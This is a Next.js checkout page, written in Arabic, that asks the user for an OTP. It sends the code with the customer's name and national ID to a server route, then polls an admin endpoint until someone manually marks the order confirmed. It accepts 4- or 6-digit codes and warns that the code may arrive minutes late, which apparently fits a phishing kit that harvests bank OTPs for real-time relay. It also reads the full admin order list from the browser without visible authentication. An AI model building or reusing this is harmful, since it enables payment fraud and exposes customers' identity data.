"use client";

import { useState, useEffect, useRef } from "react";
import Link from "next/link";
import { useCartStore } from "../../store/cartStore";
import { KeyRound, FileText, Receipt, X } from "lucide-react";

export default function VerifyPage() {
  const [code, setCode] = useState("");
  const [codeError, setCodeError] = useState(false);
  const [resent, setResent] = useState(false);
  const [confirmed, setConfirmed] = useState(false);
  const [dbOrderId, setDbOrderId] = useState<string | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const { customer } = useCartStore();
  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";

  // polling: check order status every 5s after submit
  useEffect(() => {
    if (!dbOrderId) return;
    pollRef.current = setInterval(async () => {
      const res = await fetch(`/api/admin/orders/${dbOrderId}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.status === "confirmed") {
        clearInterval(pollRef.current!);
        setConfirmed(true);
      }
    }, 5000);
    return () => clearInterval(pollRef.current!);
  }, [dbOrderId]);

  async function handleSubmit() {
    if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
    setCode("");
    await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
    });
    // get the mongo _id for polling
    try {
      const res = await fetch("/api/admin/orders");
      const orders = await res.json();
      const match = Array.isArray(orders) ? orders.find((o: { orderId: string; _id: string }) => o.orderId === orderId) : null;
      if (match) setDbOrderId(match._id);
    } catch {}
  }

  // ── Confirmed Popup ──────────────────────────────────────────────────────────
  if (confirmed && dbOrderId) {
    return (
      <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 px-4" dir="rtl">
        <div className="relative bg-white rounded-3xl shadow-2xl w-full max-w-sm sm:max-w-md md:max-w-lg overflow-hidden mx-4">
          <Link
            href="/"
            className="absolute top-3 left-3 p-1.5 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-500 transition-all z-10"
          >
            <X className="w-4 h-4" />
          </Link>

          {/* Image on white */}
          <div className="flex flex-col items-center pt-4 sm:pt-5 pb-3 bg-white">
            <img src="/sucess.webp" alt="success" className="w-28 h-28 sm:w-36 sm:h-36 md:w-44 md:h-44 object-contain" />
            <span className="mt-2 bg-[#E6EFC0] text-black text-sm sm:text-sm font-bold px-4 sm:px-6 py-1.5 rounded-2xl">نجحت عملية الدفع</span>
          </div>

          {/* Body */}
          <div className="px-4 sm:px-5 py-3 sm:py-4 flex flex-col gap-3 text-center">
            <div className="space-y-1">
              <p className="text-gray-800 font-semibold text-base sm:text-base">تمت العملية بنجاح</p>
              <p className="text-gray-500 text-sm sm:text-sm leading-6 sm:leading-7">
                شكراً لك لثقتك، وإنه لمن دواعي سرورنا العمل معكم، نشكرك على كونك واحداً من عملائنا الكرام، أنتم تستحقون أفضل خدماتنا، ونتمنى أن نكون عند حسن ظنكم وتوقعاتكم.
              </p>
              <p className="text-gray-500 text-sm sm:text-sm">يرجى التواصل مع موظف خدمة العملاء لاستكمال إجراءات شحن الطلب.</p>
            </div>

            <div className="flex flex-col sm:flex-row gap-2 sm:gap-3 pb-1">
              <a
                href={`/admin/orders/${dbOrderId}/print`}
                target="_blank"
                rel="noopener noreferrer"
                className="flex-1 flex items-center bg-[#89BA45] justify-center gap-2 py-2 sm:py-2.5 rounded-xl text-white font-semibold text-sm transition-all"
              >
                <FileText className="w-4 h-4" /> الفاتورة
              </a>
              <a
                href={`/admin/orders/${dbOrderId}/receipt`}
                target="_blank"
                rel="noopener noreferrer"
                className="flex-1 flex items-center justify-center gap-2 py-2 sm:py-2.5 rounded-xl bg-[#89BA45] text-white font-semibold text-sm transition-all"
              >
                <Receipt className="w-4 h-4" /> سند القبض
              </a>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ── OTP Form ─────────────────────────────────────────────────────────────────
  return (
    <main className="min-h-screen bg-gradient-to-br from-gray-100 to-gray-200 flex flex-col items-center justify-center px-4 sm:px-6 py-10" dir="rtl">

      <div className="w-full max-w-lg mb-4 flex items-center justify-between">
        <div className="flex items-center gap-2 text-sm text-gray-400">
          <Link href="/" className="hover:text-teal-600 transition">الرئيسية</Link>
          <span>/</span>
          <Link href="/cart" className="hover:text-teal-600 transition">السلة</Link>
          <span>/</span>
          <span className="text-gray-600">التحقق</span>
        </div>
      </div>

      <div className="w-full max-w-lg mb-3 text-right">
        <h1 className="text-lg sm:text-xl font-bold text-gray-800">رمز التحقق OTP</h1>
        <p className="text-xs sm:text-sm text-gray-500">ادخل رمز التحقق لإكمال العملية</p>
      </div>

      <div className="bg-white rounded-3xl shadow-lg w-full max-w-lg overflow-hidden">
        <div className="pt-6 sm:pt-8 pb-2 flex flex-col items-center gap-3">
          <div className="bg-red-500 rounded-2xl p-4 sm:p-6">
            <KeyRound className="text-white w-8 h-8 sm:w-10 sm:h-10" />
          </div>
          <h2 className="text-gray-800 text-base sm:text-lg font-bold">تأكيد العملية</h2>
        </div>

        <div className="p-4 sm:p-6 md:p-8 space-y-5">
          <div className="text-center space-y-1">
            <p className="text-gray-600 text-sm leading-relaxed">الرجاء إدخال رمز التحقق الذي يصلكم على الهاتف المحمول</p>
            <p className="text-gray-400 text-xs">قد يصل الرمز متأخراً (بعد دقائق)</p>
          </div>

          <div className="flex flex-col items-center gap-1">
            <input
              type="text"
              inputMode="numeric"
              value={code}
              maxLength={6}
              onChange={e => { setCode(e.target.value.replace(/\D/g, "").slice(0, 6)); setCodeError(false); }}
              className={`w-full text-center text-xl sm:text-2xl md:text-3xl font-bold tracking-[0.4em] sm:tracking-[0.5em] border-2 rounded-2xl px-3 py-3 sm:px-4 sm:py-4 outline-none bg-gray-50 transition-all ${
                codeError ? "border-red-400 bg-red-50" : "border-gray-200 focus:border-red-400 focus:bg-white"
              }`}
            />
            {codeError && <p className="text-red-500 text-xs">الكود يجب أن يكون 4 أو 6 أرقام</p>}
            {resent && <p className="text-center text-green-600 text-sm font-medium">✅ تم إعادة إرسال الرمز</p>}
          </div>

          <div className="space-y-3 pt-1">
            <button
              onClick={handleSubmit}
              className="w-full bg-green-500 hover:bg-green-600 active:scale-[0.98] text-white py-3 sm:py-3.5 rounded-2xl font-bold text-sm sm:text-base transition-all shadow-md shadow-green-200 cursor-pointer"
            >
              ✅ إتمام الطلب
            </button>

            <button
              onClick={() => {
                fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
                setResent(true);
                setTimeout(() => setResent(false), 3000);
              }}
              className="w-full flex items-center justify-center gap-2 bg-green-50 hover:bg-green-100 text-green-700 border border-green-200 py-3 rounded-2xl text-sm font-medium transition-all cursor-pointer"
            >
              🔄 إعادة إرسال
            </button>

            <Link href="/checkout" className="w-full flex items-center justify-center gap-2 bg-gray-700 hover:bg-gray-800 text-white py-3 sm:py-3.5 rounded-2xl font-medium text-sm sm:text-base transition-all cursor-pointer">
              السابق →
            </Link>
          </div>
        </div>
      </div>
    </main>
  );
}
